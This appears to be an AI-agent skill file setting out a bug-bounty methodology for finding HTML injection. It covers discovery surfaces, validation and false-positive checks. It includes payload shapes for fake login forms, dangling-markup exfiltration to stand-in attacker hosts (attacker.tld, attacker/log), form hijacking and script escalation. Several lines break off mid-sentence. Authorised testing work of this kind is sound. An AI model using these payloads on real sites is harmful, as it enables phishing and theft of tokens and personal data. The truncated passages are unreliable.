---
name: bbhunt-html-injection
description: "Hunt raw HTML rendering without script execution and its phishing/content-spoofing consequences. Unified from 2 upstream skills (cbh, hunting). For authorized security testing only."
agent_created: true
---

# HTML injection hunting — unified methodology

> **Unified skill.** Built from 2 upstream skills across cbh, hunting. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method

### Autonomous Testing Priority

**Inject a recognisable HTML tag with a unique canary string. Unescaped angle brackets in the response = confirmed injection.**

**Pattern 1 — Basic HTML tag injection:**
```
<b>CANARY</b>
"><b>CANARY</b>
```
Use a unique string as CANARY (something distinct to this test run). **Proof:** the response contains `<b>CANARY` with literal `<` angle brackets — not `&lt;b&gt;CANARY`. A properly encoded app would escape `<` to `&lt;`.

**Try multiple tag types when `<b>` is filtered:**
- `<h1>CANARY</h1>` — heading tag (often less filtered)
- `<img src=x onerror=CANARY>` — attribute context
- `<a href="https://attacker.com">click</a>` — link injection (phishing proof)

**For stored injection:** inject into the storage endpoint, then GET the page where the value is displayed and check for unescaped tags.

**Escalate immediately:** if `<b>` injection works, try `<script>alert(1)</script>` — the same unsanitised input may allow full XSS.

### Web-Research Methodology Additions (2026)

Research basis: PortSwigger Web Security Academy "Dangling markup injection," HackTricks "Content Spoofing (Text and HTML Injection)," and HackTricks "Dangling Markup — HTML scriptless injection." Together they cover the two directions HTML injection can go: **fake content on a trusted surface**, and **scriptless exfiltration of real content that follows your injection point**.

### A. Discovery checklist — concrete places, params, headers, flows to look

- **Content-spoofing surfaces:** error pages, `?error=` / `?msg=` / `?message=`, "not found" pages that echo the path, status texts, search pages that print the query inside a sentence, and stock/recommendation-style messages. Replace with a long, realistic message (phone number, urgent instruction, fake domain) and check it renders completely.
- **HTML-injection escalation test:** if `<` and `>` return unencoded, switch from text injection to markup — `<h3>...`, `<form>`, `<a href>`, `<img>`, `<base>`, `<meta http-equiv>`.
- **Sensitive pages matter:** login, payment, account settings, and admin-visible fields raise impact; a clearly-labelled echoed error string on a marketing page may be harmless.
- **Service-sent emails:** any field copied into an email to *other* users (display name, first/last name, org/team/workspace/project name, invite message, comment body, ticket title, file name). Trigger invites/shares/mentions and read the raw message in a real client.
- **Dangling-markup prerequisites:** a secret (CSRF token, email, PII) rendered in clear text *after* your injection point, and a reflection that leaves `>`/`"` unescaped so you can break out of an attribute.
- **CSP check first:** read `Content-Security-Policy` before choosing a vector. Chrome now blocks HTTP URLs containing raw `<` or newline, so dangling markup may need `ftp:` or a user-interaction variant.
- **JSONP endpoints** (`?callback=`, `?call=`) as a way to call arbitrary functions or execute JS from an injected `<script src>

### Signals and surfaces

### Attack Surface

Any input that is reflected or stored and then displayed in an HTML context:
- Search boxes (`?q=`)
- Comments, feedback, reviews
- Profile fields (name, bio, username)
- Error messages (`?error=`, `?message=`)
- Subject / body of contact forms
- Admin-visible fields (ticket titles, usernames in logs)

### Techniques, payloads and bypasses

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- **Fake login form (OWASP canonical):** inject `<h3>Please Enter Your Username and Password…</h3><form method="POST" action="http://attacker/login.php">…</form>`. Even under strict CSP a form can abuse browser password autofill — check `form-action`.
- **Email-context injection:** `<a href="https://OAST.example/x">Click here to accept</a>`, `<u>evil.com</u>`, `<img src="https://OAST.example/pixel.png">` — proof is rendered markup or an OAST hit inside a genuine service email. (SMTP header/second-body injection via CRLF is a separate Email Injection class.)
- **Classic dangling capture:** break out with `">` then `<img src='//attacker.tld/log?` — the browser consumes everything up to the next `'` as the URL, sending the following HTML (and any secret) to you. Test both single- and double-quoted variants.
- **Alternatives when `<img>` is blocked:** `<meta http-equiv="refresh" content="4; URL='http://attacker/log?` (or `ftp:`), `<style>@import//attacker.tld?` (captures until `;`), `<table background='//collaborator-id?…'`, `<video poster="//…`, `<link rel=stylesheet href="//evil?`.
- **Form-stealing variants:** `<base href="http://attacker/">` redirects all relative form actions; injecting a new `<form action='http://attacker/log'>` overwrites the next form header so its data is exfiltrated; `<button formaction="https://attacker">` redirects a submit; injecting `<input type='hidden' name='x' value="` captures to the next quote and can be combined with a new form.
- **No-JS exfil via `<noscript>`:** 

### Validation and proof

### C. Validation / proof bar — how to confirm and avoid false positives

- **Plain HTML injection proof:** your vector appears with literal `<` angle brackets in the response (not `&lt;`). Use a unique numeric canary (e.g. `alert(91234)`) to distinguish your reflection from practice-page hint text.
- **Dangling markup proof = OOB data, not a rendered color.** Stand up a Collaborator/OAST listener and show the captured chunk (ideally the actual token/PII) arriving. A 0-byte image or a CSP-blocked request looks identical in DevTools — confirm on the listener side.
- **Email injection proof:** show the markup rendered in a real email client *and* in the raw source, plus any OAST pixel hit; note that a link alone may be judged lower severity than a captured secret.
- **Fake-form proof:** demonstrate a real form on the trusted domain pointing at your endpoint (and, where possible, that autofill/targeting works) — not merely that a tag rendered.
- **Avoid false positives:** (1) escaped `&lt;b&gt;` means no injection; (2) text that is clearly labelled as user input may be harmless content spoofing; (3) no OOB callback = no dangling exfil; (4) if the secret never appears after the injection point, the capture is empty — re-target the injection point.
- **Escalate when possible:** if `<img onerror>`/`<svg onload>` executes, this is XSS, not HTML injection — reclassify and follow the xss skill.

- **Three-way diff:** compare (a) benign text, (b) `<b>CANARY</b>`, (c) encoded `&lt;b&gt;CANARY&lt;/b&gt;` — only (b) with literal `<` proves injection.
- **OOB verification:** check the Co

## Source skills merged into this topic

- `hunting` — `html-injection`
- `cbh` — `hunt-html-injection`

## References

- `references/unified-method.md` — complete deduplicated union of all upstream sections
- `references/upstream-*.md` — full original SKILL.md from each contributing repo
- `bbhunt-methodology` — orchestrator, state machine and class router
